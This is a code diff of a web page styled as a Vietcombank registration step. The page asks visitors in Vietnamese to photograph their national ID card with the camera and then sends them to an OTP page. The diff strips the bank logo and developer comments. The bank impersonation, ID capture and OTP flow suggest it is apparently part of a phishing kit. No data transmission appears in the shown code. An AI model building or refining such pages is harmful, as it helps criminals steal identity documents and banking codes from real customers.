@@ -6,13 +6,11 @@
 </head>
 <body>
     <div class="login-container upload-container">
-        <img src="https://sanfactory.vn/wp-content/uploads/2023/10/logo-vietcombank-2-1400x645.png" alt="Vietcombank Logo" class="bank-logo">
         <form id="uploadForm">
             <div class="preview-container">
                 <video id="camera" autoplay></video>
                 <img id="preview" alt="Image preview">
                 <p id="placeholder">Tải lên hoặc chụp ảnh CMND/CCCD của bạn</p>
-                <!-- Added hidden canvas for capturing photo -->
                 <canvas id="canvas" style="display: none;"></canvas>
             </div>
             <div class="upload-options">
@@ -49,7 +47,6 @@
             }
         });
 
-        // Removed fileBtn and fileInput event listeners
 
         document.getElementById('uploadForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -58,34 +55,26 @@
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
                 
-                // Set canvas dimensions to match video
                 canvas.width = settings.width || camera.videoWidth;
                 canvas.height = settings.height || camera.videoHeight;
                 const context = canvas.getContext('2d');
                 context.drawImage(camera, 0, 0, canvas.width, canvas.height);
                 
-                // Convert canvas to blob
                 canvas.toBlob(blob => {
                     if (blob) {
-                        // You can send the blob to the server here
-                        // For demonstration, we'll just display it
                         const imgUrl = URL.createObjectURL(blob);
                         preview.src = imgUrl;
                         preview.style.display = 'block';
                         camera.style.display = 'none';
                         placeholder.style.display = 'none';
                         
-                        // Stop the camera
                         stream.getTracks().forEach(track => track.stop());
 
-                        // Proceed with submission logic
-                        // Show loading state
                         const submitBtn = this.querySelector('#submitBtn');
                         const spinner = submitBtn.querySelector('.spinner');
                         submitBtn.classList.add('loading');
                         spinner.style.display = 'block';
                         
-                        // Redirect to OTP page after short delay
                         setTimeout(() => {
                             window.location.href = 'OTP.html?from=register';
                         }, 1500);
